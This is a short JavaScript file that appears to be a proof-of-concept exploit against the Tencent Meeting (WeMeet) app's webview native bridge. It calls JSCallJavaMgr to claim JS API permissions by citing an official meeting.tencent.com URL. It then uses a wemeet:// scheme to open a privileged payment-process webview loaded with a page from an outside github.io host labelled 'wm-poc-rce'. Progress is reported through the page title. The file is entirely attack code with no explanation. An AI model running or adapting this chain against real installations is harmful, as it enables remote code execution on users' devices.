(function(){
  document.title='P129TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P129CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P129TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P129TB-NOMGR:'+location.host;return}
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var att='https://gitwhs.github.io/wm-poc-rce/p129atk.html';
  var sch='wemeet://page/pay/main_process_webview';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['JC','OpenApiPlugin','JsApiConfig',{
      url:official,
      jsApiList:['ExportFile','LoadUrl','OpenNewPage','LoadTemplateWebView']
    }],
    ['CK','OpenApiPlugin','CheckJsApiConfig',{
      url:official
    }],
    ['OP','CommonPlugin','OpenNewPage',{
      scheme:sch,
      router_params:{url:att}
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P129TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P129-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
